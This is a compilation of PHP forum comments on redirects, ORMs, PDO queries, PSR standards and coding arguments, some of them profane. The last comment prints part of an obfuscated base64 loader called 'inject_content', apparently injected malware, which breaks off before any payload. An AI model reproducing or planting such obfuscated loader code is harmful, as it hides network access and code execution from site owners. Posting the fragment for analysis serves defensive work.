No problem! Also, don't forget to call exit; after calling header to redirect your page. http://stackoverflow.com/questions/3553698/php-should-i-call-exit-after-calling-location-header And thanks for the gold!
Thanks for the tip. And it's quite alright. I wish I'd just swallowed my pride and asked 3 hours ago! :)
Ahh, didn't catch that. Eww.
You DON'T WANT to redirect crawlers as they do not save cookies... So make sure you check for `googlebot`, `msnbot`, `bingbot` and such. Better yet, do it with a JS file, not in PHP. Or you break your SEO. PS: You redirect is not good. It lacks the code. 302 = temporary, 301 = permanent. Check this out: http://blog.codeangry.com/posts/12
Version control.... Haha just emails with the code zipped up
Thanks for the feedback. In context, I got some Adwords vouchers and created a landing page to run a campaign with: http://www.mythosgaming.com/welcome/ I then thought it might be an idea to link people here initially to get a feel for what the websites about. The initial comments answered my questions on how I go about doing it, and I did get it all working but I did initially consider SEO impacts on the homepage so I haven't actually implemented it yet. Edit - Speed typing! Edit - Also, because I didn't want to edit any of the original template files I was looking for a way to utilise the wordpress mu-plugins folder and my-custom-functions, so I didn't have to worry about automatically updating the core files in future.
Nope just a class with a bunch of methods
You realize the `Zend` name is copyrighted? And that there's already a Zend Framework? Which could easily be confused with your Zendfox Framework. edit: &gt; Zendfox is a Web Application Framework (WAF) build on the top of Zend framework Yes, you already know this.
I thought you'd get a kick out of that. ;) At the very least, just look at the evolution of the unit tests that are in place and you'll see why #1 is now the way it is. Thank you, I'll be here all week. Don't forget to tip your waitress.
I agree, I am completely against exposing class properties as public to the outside world, and create strict getters/setters to interact with data. That said, you're not going to jump from using magic methods to using getters/setters, you have to take baby steps, else your team won't adopt to the changes.
Must have been occasional typos.
If you're worried about modifying the template and still being able to update the theme without issues (usually), you should look into making a child theme. If you're only changing a few items, it should be really easy for you to set up. Plus, if you decide to scrap your edits in the future, you can just turn off the child theme. 
I can't see how there would be a performance hit, short of using a 32-bit package on a 64-bit OS. It's all the same code, and stuff that the package comes with that your programmers don't use will never get executed. The memory hit to bootstrap all of it is insignificant, unless your servers are drastically overloaded (at which point you should have been talking about scaling your application and DC several months ago). And yes, you can. As long as the PHP .so is installed where Apache expects it to be, you're just fine.
Php jobs?
Why do people throw the term bloated around so much. OP- can you explain to me what you mean by that? Because to me, ORMs like Doctrine are built for your convenience. They are made by people who are smarter than you and I. Why re-invent the wheel?
You honestly think that code that looks like that, that doesn't live in source control, is unit tested?
&gt; Why re-invent the wheel? While wheels are wheels, I don't think that a wheel for an 18 wheeler will fit a Honda Civic. Therefore sometimes a wheel need to be re-invented, or reduced for it to work properly on something else. So on that same note, VoodOrm provides something less complicated than Doctrine. Just like you said that Doctrine/Orms like are built for convenience, VoodOrm is also built for convenience. By the way being smart is also relative. I may not be smart to you, but to someone else I may be a genius. :) But thanks for your input, and please check the documentation on github. Happy Holidays
This post seems a little open-ended. Looking at the docs it seems pretty functional as it is; what do you think it needs? Where do you think it needs improvement? I've always been curious about ORMs and why people think they are necessary. I can see the elegance to them when it comes to updating or inserting single rows of data, but for querying, does $users-&gt;where("city", "Charlotte")-&gt;whereGte("age", 21)-&gt;wrap() -&gt;where("gender", "female")-&gt;where("city", "Atlanta"); really seem more efficient or easier to understand than the equivalent SQL query? I've never had a non-trivial application that didn't require significant SQL/index tuning and auto-generated SQL usually had to be thrown out at some point. edit: I didn't mean this as a criticism of VoodOrm, I meant more generally. The project looks good.
Technically, VoodOrm isn't even an ORM. It's a Query Builder. If VoodOrm were actually an ORM, I would assume it would be an Active Record ORM, and it would pay closer attention to the datatypes of the table columns. For example, I'd expect to see more of this: `$sth-&gt;bindParam(':calories', $calories, PDO::PARAM_INT);` .. with variables in place of the parameters, of course 
 how much data is being pulled? How big is your table? How often is data loaded into it? Are you able to index any columns
Sorry- It was not my intention to say that you were not smart, only that the guys who made doctrine certainly know what they are doing. I still don't know what you mean by bloated? Does it use too much memory for your application?
LMAO. The only 'help' you gave me prior to your over-the-top BS above is: 'They don't. They adhere to the conventions. There is no performance cost. You're creating a false dichotomy.' And that's laughable as 'help'. The problem I've had with some 'help' in other posts is that the issue of balancing performance with standards compliance etc is being distracted from, for example, by assumptions that I'm making worse errors so should focus on them. That's *not* how you address someone's questions - but rather it's insulting. Just as is your OTT BS above. I've read your post history - it's terse, rude, and generally unhelpful. You come cross as if you have some kind of persecution complex. And as you haven't been helpful in a prior post - idgaf if you never post a reply to mine again - you add nothing constructive. Compare that to those that have helped me, whom I've been grateful to learn from. So, NO, I haven't rejected every bit of advice or been ungrateful for everyone's advice. That's your twisted hyperbolic BS version of reality. Go take a sedative. 
Thanks very much for the link - I came across it when researching PDO, but as yet haven't got my head around Pomm, and thought that I should 'start at the very beginning' - with PDO and then later look at Pomm to see if it makes more sense then. I'll certainly check it out again in the future, thanks again.
With the sort on the current example, only 65 rows are being pulled out of 20709 rows. There are only 5 columns though. I'm not sure by what you mean 'how often is data loaded into it' - the script I posted is the entire script I have so far. I'm not sure how to index a column, either. I'm new to SQL &amp; PHP, really, trying to learn this as a hobby.
You could try creating an index on the column you are filtering on. And then see if this improves your speed. A good tool to help is the explain plan, you put your query into sql server and run it. It's really not that much data and you're not joining tables or using many clauses so the explain plan might not give you too much. I asked about inserting, writing to table because if there are lots of updates and inserts an index can slow then down. If it's read heavy though not having lots of updates or inserts an index will help. That's as much as I can give you sql wise.
Okay, I'll try to create an index on the table. One thing I found - if I close SQL Management Studio, the query runs instantly in PHP...
You make so many assumptions. I understand every point you make - my code is quite easy to maintain, and it adheres to standards (all that I can find at least), etc etc. That's how I've purposely built it. So I'm now going back over my code and trying to optimize it for performance before launch. I'm not prematurely optimizing it. I'm trying to cut potential bottlenecks everywhere I can - from the smallest function to the largest one, and part of that is learning what is memory efficient and what isn't. And NO I do not want to just 'throw new hardware' at bottlenecks - I want to engineer my app to make the most of hardware rather than throw the most hardware at it. To many here that's the wrong way of doing it. But I'd say that's just because most focus on dogmas about premature optimization etc rather than asking the right questions. The reason I asked this question in the first place is because I feel my code is at the point that I can optimize it for performance. I never wrote that I'm against elegance - you keep making cliche assumptions to hit over the head with cliche retorts. Elegance is only one virtue. However it doesn't always justify the actual existence of code, just as there's a difference between beauty and truth. The truth is the function/purpose of the code - as elegant/beautiful as it is - it doesn't always need to exist - something else eg a server could replace it and do a better job at. That's how I'm looking at my code. For example, I see some very elegant code in frameworks but I don't always want to use it, yet it's existence bogs down the overall code base of that framework because it's almost inextricably coupled to other code in the framework. So I don't use the framework.
Cliches are cliches are ... ;-)
That is odd, did you have a query running against the table maybe
You're right about the query builder. These apis that try to look like sql are kind of old fashioned. The prefered method is more of a critetia api that matches closer to object domain. Easier to read and follow, and much easier to compose complicated systems if need be.
Even if you think it isn't premature optimization (and I'd still argue it is), it isn't effective optimization. When it comes to optimizing code you need to look at whether the benefit of doing so offsets the cost of doing it, and there are many costs: Design and technical debt, actual cost of your time performing the optimization, future maintenance costs as often these micro optimizations lead to code which is idiosyncratic and is thus difficult to follow and maintain - or worse is brittle. All of that should be weighed before you even think about "not throwing hardware at it". And sorry, you are the self identified n00b here. You either take the advice of an experienced hand or you don't. You don't get to dismiss what we're saying as being cliche or irrelevant. edit: If you bothered to follow the link I posted, and look at who wrote it - this is a company with a large multi-tenancy product, who built a framework to deliver it. The parallels with what you are trying to do are pretty clear. These guys have experience launching these kind of products and you'll find that book is particularly useful at telling you whether you are on the right track or not.
 if if = then then then = else; else else = if; insanityWolf.jpg
can't be sure, but I'd take a look at line 123 ... comment that out and see what happens?
LOL. Fair enough.
Sorry for the late reply. Regarding translations, this should probably happen in the view layer of the application. A good example of this is how twig handles translating content: http://twig.sensiolabs.org/doc/extensions/i18n.html.
Still redirecting unfortunately!
I've always thought accessing properties from the object $object-&gt;var = 'foo' was a bad idea. You should be using getters/setters for that. Or maybe I've completely missed it. 
&gt; Thank you, I'll be here all week. Don't forget to tip your waitress. That's a typical line from a bad standup comic routine. I'd presumed the sarcasm was clear enough. I guess it wasn't. 
Ahh it then calls -&gt;error() which also has the redirect in it (because..i have no idea why). Comment out line 95 as well. I can't be certain but it looks on first blush that whoever has done this has modified a core framework file. Can you provide the path relative to the root of the application that this file belongs to? if it is a core framework file your fix might be to revert this file back to the real thing - then try and solve the error handling in a more appropriate way. It has been a long while since I've done anything with Cake so take my answers with a grain of salt :)
This file is in /www/cake/libs 95 commented... Still redirecting. I've inherited this work unfortunately, I asked about getting the original guy involved but apparently the site owner seriously fell out with him, so it's not happening. Fixing this redirect pretty much stands between them and recovering their search results, so it's fairly imperative that it's discovered.
Here are a couple of thoughts on the project. The API does not appear to have clearly separated concerns at first glance. I would assume that calling $db-&gt;users() would return a strict table reference of some sort. Instead, I can do the following: $users = $db-&gt;users(); $users-&gt;name = 'Estel'; $users-&gt;save(); // This implies that I've been working with a single entity the entire time. What?? When using an ORM, I would expect the API to be more strict, and require the developer to do something else. $user = new User(); $user-&gt;setName('Estel'); $db-&gt;users()-&gt;save($user); The project has potential, overall, but needs work. This consists of a single monolithic class that does everything. This means that I can treat a table as an entity, and potentially an entity as a table. This would make for very confusing code. I think using an entity as a way to retrieve a separate table is strange, as it appears you can do so in your examples at https://github.com/mardix/VoodOrm#extends-voodorm-to-your-model. If I'm misrepresenting something, please don't hesitate to let me know. :-P
I would probably give PDO a shot, I've run some very large queries against huge databases without too many slowness issues. $hostname = "127.0.0.1"; $database = "Tester"; $username = "tester"; $password = "password"; $dsn = "sqlsrv:server=$hostname;Database = $database"; $connection = new PDO($dsn, $username, $password); $connection-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); # Yours $sql = " SELECT * FROM dbo.AllProds WHERE ProdSet LIKE 'zen%' AND (QTYReg IS NOT NULL OR QTYSpecial IS NOT NULL) ORDER BY ProdName"; # My understanding is to stay away from LIKE when possible. /*$sql = " SELECT * FROM dbo.AllProds WHERE SUBSTRING(ProdSet, 0, 3) = 'zen' AND (QTYReg IS NOT NULL OR QTYSpecial IS NOT NULL) ORDER BY ProdName";*/ $allProdsQuery = $connection-&gt;prepare($sql); $allProdsQuery-&gt;execute(); while ($row = $allProdsQuery-&gt;fetch()) { print_r($row); echo $row['QTYReg']; echo $row['QTYSpecial']; } I used prepare() and then execute(). In an instance when you have no parameters to bind, you could use query() instead.
Agreed. Allowing properties to be set directly is definitely not ideal. It would be cool if the ORM looked for a getter/setter first, then looked for a property to populate.
In his defense, Doctrine is generally slow and very memory hungry. There are things in place to alleviate the slowness, such as caching, but it can only do so much.
Thank you for your feedback. VoodOrm maps the object properties with your table's columns. So if you have the following column in table_x (id, first_name, last_name, address), upon querying the table, the following properties will be available: $object-&gt;id, $object-&gt;first_name, $object-&gt;last_name, $object-&gt;address. And yes VoodOrm uses the magic method __get() to retrieve the data that is stored. Or you can use $object-&gt;get("first_name") to do the same. When you set $object-&gt;var = 'foo' it use the magic method __set() which in turn uses the set() method to set variable. So $object-&gt;var = 'foo' is equivalent to $object-&gt;set('var', 'foo'); I made it this way, so VoodOrm can be quickly added to any small/medium project without doing too much effort. Now what if you set the wrong properties, this is handle by PDO Exceptions, therefore you would get an Exception of column not found. 
Thank you for your feedback From your example $users = $db-&gt;users(); $users-&gt;name = 'Estel'; $users-&gt;save(); *$users = $db-&gt;users();* will assume that you have a table called **users** and create an instance for it. So *$users = $db-&gt;users();* will be able to do any CRUD operations. I probably need to be more clear in the documentation, with the code below: $users = $db-&gt;users(); $users-&gt;name = 'Estel'; $users-&gt;save(); VoodOrm will insert a new entry, where the column 'name' is Estel and everything else will be null or empty. The same above can be achieved with $users-&gt;insert(["name" =&gt; "Estel"]); Now let's say you are working with a single entity, let's say id 1234 exists $users = $db-&gt;users(); $user_estel = $users-&gt;findOne(1234) $user_estel-&gt;name = 'Estel'; $user_estel-&gt;save(); As you can see, any update $user_estel only update $user_estel. I used the active record pattern to keep a state on this single record. And of course this can achieved with: $users-&gt;findOne(1234)-&gt;set("name", "Estel")-&gt;save() $users-&gt;findOne(1234)-&gt;update(["name" =&gt; "Estel"]) Yes VoodOrm is not too strict, because I expect the developers to implement some strictness on their end and in the database, like, setting the proper data type for the columns for data validation etc. 
ISIBAISIA=I've Said It Before And I'll Say It Again. Python is going to have many of the same performance foibles as PHP. Anything that is not compiled before being run is going to have a certain set of performance limitations. The best use of PHP in a performance-demanding environment is to make multiple components deployed to balanced nodes and designed to be either stateless or have all state in closures. And uh, buy lots of nodes. All the alternatives you listed are not improvements over PHP in the area of performance. When I said "wrong type of language", I didn't mean PHP is a type, I meant the type of language PHP is -- namely, interpreted.
I agree with the use of the ActiveRecord pattern, as in your following example: $users = $db-&gt;users(); $user_estel = $users-&gt;findOne(1234) $user_estel-&gt;name = 'Estel'; $user_estel-&gt;save(); As a developer, though, I would have a preference to not be able to use $users directly as a single entity. It's just too... weird. I *really* wouldn't want to see a less experienced developer get a hold of the library and end up making a mess since the library enables them and doesn't force good (or even mediocre) practices. Since the developer may not know any better, they could litter their codebase. Overall, though, keep it up! With some refactoring, it could be something I would use in favor of Doctrine or Propel.
I don't have large server farms like I guess YouPorn does (read up on the percentage of 'net traffic that video porn sites have and how big their infrastructure typically is), and I don't have an army of coders, IT staff, etc to throw hardware at solving problems. And I'm trying to write the smallest bits of code to the largest functions and classes not just securely, and to standards eg PSR, but for performance too. Only by making a framework/app that will perform well from the start will I ever be able to dream of scaling up to meet big user demand. Writing slow code won't allow me to do that. But learning to write fast code that meets standards, is maintainable, etc too - will allow me to build my app to grow with demand. Congrats on the cliche toaster joke.
Bloated can also refer to having more than what is needed. Like in the wheel analogy. You can probably force an 18 wheeler wheel on a Honda Civic, but it's just not needed.
Hey man, stop acting like a jerk, will you? People are giving you honest feedback about your probably-shitty code and you're acting all uppity.
Now you are being disrespectful. For a start, standards like PSR exist primarily for the sake of maintainability. Consistency makes code maintenance easier. Secondly, I and others have answered your questions many times, but to reiterate: established standards and programming idioms are a distillation of the balance you seek. Nobody comes up with these things from a desire to make code not perform. However raw performance is not, and should not (with the exception of a few cases which are not in play here) be prioritized of maintainability. The reason is that writing code which is not maintainable constitutes a technical debt - that is time you have to spend in the future either fixing or coding around terrible decisions. That isn't to say you shouldn't write performant code. You should. Of course you should. However when it comes to optimizing, shaving fractions of a millisecond off per request is wasting your time and your employers money (and if your employer is yourself, it is wasting your money too). Thirdly, shaving a few micro-seconds off a router does NOT reinforce good coding practices. Not by a long shot. Because in order to perform that shave you have to write code which does not comply with an established coding standard and which is immediately more difficult for you or for others to understand. Such a decision may in fact mask defects and make it difficult to determine what is going on should a problem arise. I'll admit in this particular case this seems unlikely however it goes to a general attitude. Finally, for you to call people on their knowledge of the topic, and declare that we are obsessing over a few "cliches" while you continue to bang on about performance is outwardly disrespectful. The fastest solution is NOT always the best solution. The most readable/elegant solution **often** is. The cost of paying people to write code is the single largest expense any software development project will incur. You owe it to your future self and anyone else who might be working on your code base to code with this in mind. It is clear that all you want is an affirmation for what you are doing, and you never intended to take people's advice. I sincerely hope nobody else has to work with you on a software development project. 
FFS! You keep spouting BS about maintainability etc as if I'm writing that I'm writing code that tries not to be maintainable, which is the fking opposite of what I'm doing. I'm simply trying to write code that is ALSO fast. FKING GET THAT ALREADY? You really like to lecture people about the OBVIOUS and try to prove that you know every fking buzz word from 'technical debt' to whatever. Idgaf... go lecture others... and let others who have actually addressed the issue I raised about balancing convention with performance discuss that topic. Worse you make up PURE BS fed from more fking ASSUMPTIONS about my code and code in general because you appear to lack an imagination or actual experience coding - for example: 'Because in order to perform that shave you have to write code which does not comply with an established coding standard and which is immediately more difficult for you or for others to understand.' ^^^ That's probably one of the biggest crocks of BS I've read in forever. LMAO = 'Finally, for you to call people on their knowledge of the topic, and declare that we are obsessing over a few "cliches" while you continue to bang on about performance is outwardly disrespectful.' YOU are the ONE 'banging' on about every other fking thing than the topic I originally wrote about - spouting about every buzz word you can squeeze in for whatever reason eg to prove you know something. AGAIN - Idgaf - go lecture others that know nothing about maintainability and the 'sins of not writing it'. OMFG = 'It is clear that all you want is an affirmation for what you are doing, and you never intended to take people's advice.' You haven't given me any FKING ADVICE MORON! All you've done is rudely/arrogantly spammed me with BS about every other fking topic from technical debt to maintainability etc as off-topic BS because your mind is full of assumptions about how I code. All I asked was how others balanced writing code to conventions with performance and got your third grade teacher BS about maintainability etc instead. I should just write an app that prints random stuff from text books and spouts it back under your username... it would read as irrelevant and as random as the cliche BS you post.
Lol &gt; You can probably force an 18 wheeler wheel on a Honda Civic That would be nuts. The wheels on the 18wheeler are even taller than the civic's height 
/cake/libs is the framework core iirc... :( And we can tell that it has been mucked with because it is set up to redirect to your domain. Best advice I can offer at this point is to find out the version of cake you are using, go dig out the original file from the repository and replace this one, even if temporarily - if only to rule it out as the cause of the problem. Sorry I can't be of more help :\ 
I'd second /u/ramse's suggestion of PDO. Using the _ extensions directly is bad juju these days. I'd also add to that if you're getting slowness in a query like that it's probably not the extension at fault, it's probably either your query or your database structure. And the same issues will apply whether using SQL Server, MySQL, Oracle, or anything else. Make sure your tables are properly indexed and normalized, especially if you're joining on them, and make the "fastest" connection you can. /u/ramse rightly pointed out that `ProdSet like 'zen%'` isn't optimal. That looks like the sort of thing that could be normalized better, giving you `ProdSetId = 3` or something.
It's another abstraction layer. It's more about relationships and maintainability than anything else. I look at some code I've done for one project years ago. It's a maintenance nightmare. Tons of bespoke SQL. $query = 'SELECT a.*, year, make, model, badge, colour, u.city, st.state, st.state_short, aus.status as auction_status FROM auction_items AS a LEFT JOIN auction_bids AS b ON b.itemID = a.ID AND b.typeID = 1 LEFT JOIN auction_status AS aus ON a.statusID = aus.id LEFT JOIN auction_users AS u ON a.userID = u.ID LEFT JOIN states AS st ON u.state = st.id LEFT JOIN vehicle_details AS v ON v.auction_id = a.ID LEFT JOIN models AS md ON md.id = v.model_id LEFT JOIN makes AS mk ON mk.id = md.make_id LEFT JOIN badges AS bg ON bg.id = v.badge_id LEFT JOIN type_colours AS c ON c.id = v.colour_id LEFT JOIN type_transmission AS t ON t.id = v.transmission_id LEFT JOIN type_body AS tb ON tb.id = v.body_id LEFT JOIN type_drives AS td ON td.id = v.drive_type_id LEFT JOIN type_fuel AS tf ON tf.id = v.fuel_type_id WHERE a.auction_end &gt; '.time().' AND u.country_id = '.$_SESSION['l10n']['country_id'].' AND a.statusID = 2 AND a.userID != '.User::getSimpleUser(); This is not an isolated query. An **almost identical** query with slightly different values is used to get other conditions. In fact, something very similar to this query is used maybe 10 times through the site, and requires constant updating if db changes are made. The equivalent in Eloquent would be: Car::where('countryID', '=', $_SESSION['l10n']['country_id'])-&gt; where('statusID', '=', 2)-&gt;where('userID', '!=', 'User::getSimpleUser())-&gt;get(); All of the rest should be self-managing. Changes to the database will be much, much simpler to manage from a central point, and literally hundreds of lines removed outright from the code. 
What he said - I would also think about using an actual 404 page rather than the homepage - without being able to trawl through code it is almost impossible to figure out where the redirect occurs. I also suspect that if you intercepted the broken URLs with a HTACCESS rule you will be able to at least channel your external link equity with a 301 to a page you control. 
Holy moly I can't believe I just typed out a response to you in another comment thread. What a waste of my time. Sorry that us people who've been using PHP for years can't help you. We must all be so very stupid.
Try them out and use the one that suits your needs. They're all different and do things in different ways and only you can decide what works for you.
Another for PDO - if you want to learn the newest standard, PDO. First result on YouTube: http://www.youtube.com/watch?v=dF8hoPj-1bc PDO is safe and simple, and won't take you long to use at all
No. What you do is the following: All dependencies, which you install via composer (if you're not use composer yet, use it now!) go into /vendor/. In my projects I create a folder /src/ from where on in the namespace mapping applies. You can then hook auto loading up by specifying to composer that you're namespace lies in src (you can do that in you're. composer.json). After this, just include vendor/autoload.php in you're bootstrap file ( eg index.php) and code away. 
Ever heard of Faker? https://github.com/fzaninotto/Faker
I'm sure that program takes up resources on your SQL database - which would explain why it ran so much faster once you closed the program.
Use PSR-0 for autoloading standards with flexibility to include those who don't stick to the standard and may require a separate name-pathing. Thus the CMS should allow for including those - as in @yeskia's response. But the basics should be to stick with a particular style of autoloading like PSR-0.
PSR-2: &gt; Code MUST use 4 spaces for indenting, not tabs. &gt; There MUST NOT be a hard limit on line length; the soft limit MUST be 120 characters; lines SHOULD be 80 characters or less. **screw that**! That tab was invented for a reason, and 80 characters!? What is this 1982? &gt; Opening braces for classes MUST go on the next line, and closing braces MUST go on the next line after the body. ... &gt;Opening braces for control structures MUST go on the same line, and closing braces MUST go on the next line after the body. Yeah, this will really help make your code not look retarded
I agree with you on this one--I have always and will always use tab indents! But still, OP asked for standards, and that's what we've got ;) I do recall there being a decent argument for spaces, but I can't remember what it was and I do remember personally disagreeing with it. Still, the rest of PSR is pretty decent, especially where language semantics are concerned. 
&gt; The PHP Framework Interop Group is trying to formalize semantics for PHP. Start here and read the other PSR standard levels: http://www.php-fig.org/psr/psr-1/ Perhaps I'm being thick, but these various documents seem to be describing best practices and conventions (variable name capitalization, tabs/spaces, etc.), rather than a semantics. Am I wrong? &gt; There's also http://www.phptherightway.com/ which attempts to define modern best practices. This looks useful, thanks! &gt; If you know javascript, you can assign functions to variables as well: &gt; &gt; var fn = 5; &gt; console.log(fn); // Displays "5" &gt; fn = function(in) { return "Function with argument " + in;}; &gt; console.log( fn(4) ); // Displays "Function with argument 4" &gt; &gt; Which is similar (though not equivalent) to PHP's variable functions. I'm not sure this is similar. That looks like an example of Javascript having first-class functions. [PHP "variable functions"](http://www.php.net/manual/en/functions.variable-functions.php) look more like dynamic scoping: the value of a variable is looked up at runtime using a string. This is a bit like, though not the same as, the `with` construct in Javascript.
Semantics of PHP are specified by the documents available at http://lxr.php.net/xref/PHP_TRUNK/Zend :)
I'll check out PDO - hopefully I can find some good documentation, although /u/ramse's example is a good start. The reason for the 'like 'zen%'' is that it's just a single spreadsheet imported into a DB table at the moment - haven't done any work on converting to a proper db with multiples tables. I know it's dirty!
This is a very useful article, thanks.
Well what is the project? A CMS? E-commerce site? Directory? Static site? There are a large number of tools which are available to you, but you will need to pick depending on the project. If you want to code from scratch I'd look at using composer to define your dependancies. For a text editor id use sublime, though if you're looking at using an IDE, I usually use netbeans, though have heard good things about PHP Storm. The main advantage with using an IDE is that you'd be able to set breakpoints in your code, though this would mean you'd need to enable xdebug in php.ini (though this is included if you decide to use xampp as your environment). 
&gt; Which is similar (though not equivalent) to PHP's variable functions. What you're describing is the equivalent of [anonymous functions](http://www.php.net/manual/en/functions.anonymous.php) in PHP, as the function doesn't have a name but is held within a variable. This is different than variable functions, in that variable functions have a name, the name is then stored in a variable, and the function is invoked via the variable. $thing = new Thing(); foreach (['x', 'y', 'z'] as $dimension) { $getter = 'get' . ucfirst($dimension); $setter = 'set' . ucfirst($dimension); $thing-&gt;$setter($thing-&gt;$getter() + 1); } Note the difference. I'm not defining $getter to be equal to a function, I'm just setting the value of $getter to be the name of the function. Things like this tend to shorten the typing a developer has to do, at the cost of readability and long term stability. Since most code is written once and read many times, I generally recommend against doing clever things.
&gt; Perhaps I'm being thick, but these various documents seem to be describing best practices and conventions (variable name capitalization, tabs/spaces, etc.), rather than a semantics. Am I wrong? You're correct. It is the generally accepted best practices/conventions, which I'm sure will be helpful, but not what you're looking for in this question. 
Aha: `extract` is the PHP equivalent of Javascript `with`. A key thing that's bugging me at the moment is: which methods like `extract`, `call_user_func`, etc., are primitive parts of PHP, and which are just library functions? (I have a feeling someone will come along and say, "well, there's no such distinction ...")
Oh yeah don't get me wrong; good reply on bkanber's behalf. I'm just annoyed by some of these standards :) One o the arguments against tabs is that not all editors will render them the same way. To that I say, "Not my problem. Get a better editor"
I just want to say thank you for posting the "all" pages version instead of the paginated version of the article. It's a simple thing, but one that is appreciated.
There are no library functions, it is all in the core. A very large "core". Have fun with PHP.
Just read this via HN on the train into work - well worth a read.
learn to deal with it. The tab/spaces war is old hat. Once you just accept it you'll find your life is much happier. You can tell most good editors to automatically replace tabs with spaces so it isn't like your typing is going to be hurt. 80 characters - it says SHOULD be 80 characters or less. It says there MUST be a *soft* limit at 120 chars. If you want to be a moron and write 400 character long lines of code, feel free. You won't be in breach of PSR-2. Brace position - another religious war, but it certainly doesn't make your code look "retarded". It just looks different to what you are used to. Changing brace position conventions is not something that is difficult to do. You'll get over it soon and not long after that you will find the aesthetic isn't bad either.
You should checkout Sylius or Magento. Sylius is build with fully decoupled Symfony based components. Magento has a steep learning curve but you can't deny its current position in the market.
to keep it simple, just grab the data from mysql with a simple select, then do whatever transformation or magic with php.
&gt; Aha: `extract` is the PHP equivalent of Javascript `with`. Worse. `extract` contaminates the entire local variable scope with whatever was extracted. It's not contained within a scope defined by the statement like `with`.
&gt; does this mean that all these functions are written in C somewhere in the Zend source? Correct. Browse around the `ext` directory structure. *Everything* is an "extension."
That's too bad. An honest to god JIT compiler could be a huge boon to PHP.
Again, if you have a 400 character long line of code, it's just silly to put a hard return in the middle of it; get a better editor. I've changed conversions in the past. I used to like Whitesmiths but switched to BSD style, but K&amp;R makes no sense.
When all unit tests pass under it then we'll have something. Right now I don't trust it to not be inserting weird bugs into my code.
That's completely understandable. It's also possible HHVM is very specifically geared towards Intel CPUs, and may not run on other processors. That would be a problem that needs solving.
Yes?
[This](http://www.phptherightway.com/pages/The-Basics.html) might be helpful to you to get started with PHP. Wordpress has its own set of functions and concepts to learn. Many of them are a little strange and unique to Wordpress. You might want to check out the [Wordpress Codex](http://codex.wordpress.com).
You're not trying to develop for cross framework interoperability, FIG is, it's even what FIG stands for. Universally standardized and readable code is kinda the whole point of having a standard.
Good video. I cringed at chmod 777 though
Thats exactly what it is.
No, but its getting close to being an easy replacement.
Better to do this in Javascript I reckon. Scripts like http://timeago.yarp.com/ and http://mattbradley.github.io/livestampjs/ will keep the screen up to date without reloading the page. And a little bit less work for your server to do.
Here's "inject_content" base64-decoded. $GLOBALS['_968955185_']=Array(base64_decode('ZGV'.'ma'.'W5'.'l'),base64_decode('ZGVmaW5'.'l'),base64_decode('c3RyaXBvcw=='),base64_decode('c3Ry'.'aX'.'Bvcw'.'=='),base64_decode('c3'.'RyaXBvcw='.'='),base64_decode(''.'c2V'.'0Y29va'.'2'.'ll'),base64_decode('dGl'.'tZQ'.'=='),base64_decode('c3'.'RyZWFtX'.'2NvbnRleHRfY3JlYXRl'),base64_decode('ZmlsZV9nZXRf'.'Y'.'29ud'.'GVudHM'.'='),base64_decode('c'.'3RybmNt'.'cA=='),base64_decode('bXRfc'.'mFuZ'.'A'.'=='),base64_decode('Z'.'nB'.'1dHM='),base64_decode('Zn'.'JlYWQ'.'='),base64_decode('c3RycG9'.'z'),base64_decode(''.'YWNvcw'.'='.'='),base64_decode('Z'.'mNs'.'b3Nl'),base64_decode('c'.'3Ry'.'cG9z'),base64_decode('c3Vic3Ry'),base64_decode('Y3VybF9pbml0'),base64_decode('aW1hZ2Vjb3B5cmVzY'.'W1wbGV'.'k'),base64_decode('b'.'XRfcmFuZA='.'='),base64_decode('Y'.'3VybF9z'.'Z'.'XRvcHQ='),base64_decode('YXJyYXl'.'fZmlsdGVy'),base64_decode('bmwyYn'.'I='),base64_decode('Y3VybF9z'.'ZXRvc'.'HQ'.'='),base64_decode(''.'c'.'3'.'RycG9'.'z'),base64_decode('Y3J'.'l'.'YXRlX'.'2Z1'.'b'.'mN0'.'a'.'W9u'),base64_decode('Y3Vy'.'bF9zZ'.'XRvcHQ='),base64_decode('Y'.'3'.'VybF9leGV'.'j'),base64_decode('Y3V'.'ybF9jbG9zZQ'.'=='),base64_decode('Y3Vy'.'b'.'F9tdWx'.'0aV9n'.'ZXRjb'.'2'.'50ZW50'),base64_decode('Zn'.'VuY3Rpb25fZXhpc'.'3Rz'),base64_decode('aW'.'5pX'.'2dldA=='),base64_decode(''.'cGFyc'.'2VfdXJs'),base64_decode('Zn'.'Nv'.'Y'.'2tvcG'.'Vu')); ?&gt;&lt;? function 